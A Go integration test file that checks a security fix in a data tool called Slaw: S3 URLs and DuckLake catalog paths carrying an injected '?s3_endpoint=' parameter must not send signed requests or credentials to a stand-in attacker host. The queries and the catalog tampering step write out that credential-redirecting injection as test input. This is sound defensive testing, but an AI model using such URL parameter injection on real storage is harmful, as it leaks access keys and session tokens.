//go:build integration

package connections_test

import (
	"context"
	"database/sql"
	"net/http"
	"net/http/httptest"
	"path/filepath"
	"strings"
	"sync"
	"testing"

	"github.com/stretchr/testify/assert"
	"github.com/stretchr/testify/require"

	"github.com/SandwichLabs/slaw/internal/connections"
	"github.com/SandwichLabs/slaw/internal/engine"
	"github.com/SandwichLabs/slaw/internal/secrets"
	"github.com/SandwichLabs/slaw/internal/session"
	"github.com/SandwichLabs/slaw/internal/workspace"
)

// evilHost is a loopback server standing in for an attacker's S3 endpoint. Any
// request it gets is recorded: a regression of #138 would send it the
// connection's key id, session token and a valid signature.
type evilHost struct {
	mu   sync.Mutex
	reqs []string
	Host string
}

func startEvil(t *testing.T) *evilHost {
	t.Helper()
	e := &evilHost{}
	srv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		e.mu.Lock()
		e.reqs = append(e.reqs, r.Method+" "+r.URL.RequestURI()+" "+r.Header.Get("Authorization")+" "+r.Header.Get("X-Amz-Security-Token"))
		e.mu.Unlock()
		w.WriteHeader(http.StatusForbidden)
	}))
	t.Cleanup(srv.Close)
	e.Host = strings.TrimPrefix(srv.URL, "http://")
	return e
}

func (e *evilHost) seen() []string {
	e.mu.Lock()
	defer e.mu.Unlock()
	return append([]string(nil), e.reqs...)
}

func (e *evilHost) params() string {
	return "?s3_endpoint=" + e.Host + "&s3_use_ssl=false&s3_url_style=path"
}

// #138: with a real connection's secret, a ?s3_endpoint= URL never reaches the
// alternate host; plain reads, Test's listing and the sidecar check still work.
func TestS3URLParametersAreInertOnMinIO(t *testing.T) {
	ep := startMinIO(t)
	evil := startEvil(t)
	ctx := context.Background()
	d := connections.Def{Name: "lake", Type: "s3", Scope: "s3://lake/raw/", Region: "us-east-1",
		Options: map[string]string{"endpoint": ep, "url_style": "path", "use_ssl": "false"}}
	good := secrets.Credential{KeyID: "minioadmin", Secret: minioSecret}

	ws, _ := memWS(t)
	require.NoError(t, ws.AddConnection(workspace.ScopeShared, workspace.ConnectionDef{
		Name: "lake", Type: "s3", Scope: d.Scope, Region: d.Region, Options: d.Options}))
	require.NoError(t, ws.SetCredentials(ctx, "lake", good, false))
	sess, issues, err := workspace.OpenSession(ctx, ws, nil, workspace.WithSessionOptions(session.WithExtensionDirectory(extDir(t))))
	require.NoError(t, err)
	defer sess.Close() //nolint:errcheck
	require.Empty(t, issues)
	eng := engine.NewManager(sess)
	_, err = eng.Execute(ctx, "COPY (SELECT 1 AS x UNION ALL SELECT 2) TO 's3://lake/raw/a.parquet'", nil)
	require.NoError(t, err)

	// Before any read: the setting is on and the URL is matched by the
	// connection's secret (so a regression would sign it), not the deny secret.
	var on string
	require.NoError(t, sess.DB().QueryRow("SELECT CAST(current_setting('s3_url_compatibility_mode') AS VARCHAR)").Scan(&on))
	require.Equal(t, "true", on)
	redirected := "s3://lake/raw/a.parquet" + evil.params()
	var matched string
	require.NoError(t, sess.DB().QueryRow("SELECT name FROM which_secret("+session.QuoteLiteral(redirected)+", 's3')").Scan(&matched))
	require.Contains(t, matched, "lake")
	require.NotContains(t, matched, "deny")

	for _, q := range []string{
		"SELECT count(*) FROM read_parquet('" + redirected + "')",
		"SELECT count(*) FROM read_parquet('s3://lake/raw/*.parquet" + evil.params() + "')",
		"SELECT count(*) FROM '" + redirected + "'",
	} {
		_, err = eng.Execute(ctx, q, nil)
		require.Error(t, err, q)
	}
	assert.Empty(t, evil.seen(), "no request, and so no key id, token or signature, reached the host the URL named")

	// What still works: a plain read, and a wildcard, which Slaw expands itself
	// (the hub reads every URL as a literal key, and a wildcard in a URL
	// parameter is no wildcard).
	rs, err := eng.Execute(ctx, "SELECT count(*) FROM read_parquet('s3://lake/raw/a.parquet')", nil)
	require.NoError(t, err)
	assert.EqualValues(t, 2, rs.Rows[0][0])
	rs, err = eng.Execute(ctx, "SELECT count(*) FROM read_parquet('s3://lake/raw/*.parquet')", nil)
	require.NoError(t, err, "a wildcard is expanded to the listed keys")
	assert.EqualValues(t, 2, rs.Rows[0][0])

	// Test still lists the scope (in its private session) and counts the object.
	res := connections.Test(ctx, d, good, connections.WithInstall(true), connections.WithTestExtensionDir(extDir(t)))
	require.True(t, res.OK, res.Error)
	assert.Equal(t, 1, res.Count)
	assert.Equal(t, "1 objects", res.Detail)
	bad := connections.Test(ctx, d, secrets.Credential{KeyID: "minioadmin", Secret: "WRONG_needle9"}, connections.WithTestExtensionDir(extDir(t)))
	require.False(t, bad.OK)
	assert.Equal(t, session.StatusNeedsCredentials, bad.Status, bad.Error)
}

// #138, a data-sourced URL: the catalog of a lake in object storage names a
// data file whose relative path carries ?s3_endpoint=. It is refused by the
// vet, and nothing is sent to that host whatever happens.
func TestDuckLakeDataFileWithURLParametersIsReadLiterally(t *testing.T) {
	ep := startMinIO(t)
	evil := startEvil(t)
	ctx := context.Background()
	ws, _ := memWS(t)
	require.NoError(t, ws.AddConnection(workspace.ScopeLocal, workspace.ConnectionDef{Name: "store", Type: "s3", Scope: "s3://lake/", Region: "us-east-1",
		Options: map[string]string{"endpoint": ep, "url_style": "path", "use_ssl": "false"}}))
	require.NoError(t, ws.SetCredentials(ctx, "store", secrets.Credential{KeyID: "minioadmin", Secret: minioSecret}, false))
	require.NoError(t, ws.AddConnection(workspace.ScopeLocal, workspace.ConnectionDef{Name: "wh", Type: "ducklake", Path: "data/wh.ducklake", ReadOnly: workspaceBool(false),
		Options: map[string]string{"data_path": "s3://lake/ducklake/"}}))
	fresh := t.TempDir()
	open := func() session.Session {
		sess, _, err := workspace.OpenSession(ctx, ws, nil, workspace.WithSessionOptions(session.WithExtensionDirectory(fresh)))
		require.NoError(t, err)
		return sess
	}
	sess := open()
	for _, e := range []string{"httpfs", "ducklake"} {
		require.NoError(t, sess.InstallExtension(ctx, e))
	}
	sess.Preflight(ctx, "store")
	sess.Preflight(ctx, "wh")
	require.NoError(t, sess.Connect(ctx, "wh"))
	_, err := sess.DB().Exec("CREATE TABLE wh.events AS SELECT * FROM (VALUES (1, 'a'), (2, 'b')) t(id, k); CALL ducklake_flush_inlined_data('wh')")
	require.NoError(t, err)
	require.NoError(t, sess.Close())

	meta, err := sql.Open("duckdb", filepath.Join(ws.Root(), "data", "wh.ducklake"))
	require.NoError(t, err)
	_, err = meta.Exec("UPDATE ducklake_data_file SET path = path || " + session.QuoteLiteral(evil.params()))
	require.NoError(t, err)
	require.NoError(t, meta.Close())

	sess = open()
	defer sess.Close() //nolint:errcheck
	sess.Preflight(ctx, "store")
	sess.Preflight(ctx, "wh")
	var on string
	require.NoError(t, sess.DB().QueryRow("SELECT CAST(current_setting('s3_url_compatibility_mode') AS VARCHAR)").Scan(&on))
	require.Equal(t, "true", on, "checked before the lake reads anything")
	// The catalog vet refuses the crafted path outright (a lake never writes a
	// "?"), and the setting above is the second layer should one get through.
	err = sess.Connect(ctx, "wh")
	require.Error(t, err)
	assert.Contains(t, err.Error(), "refusing")
	_, err = sess.DB().Exec("SELECT * FROM wh.main.events")
	require.Error(t, err)
	assert.Empty(t, evil.seen(), "the lake's own secret was never sent to the host the catalog named")
}
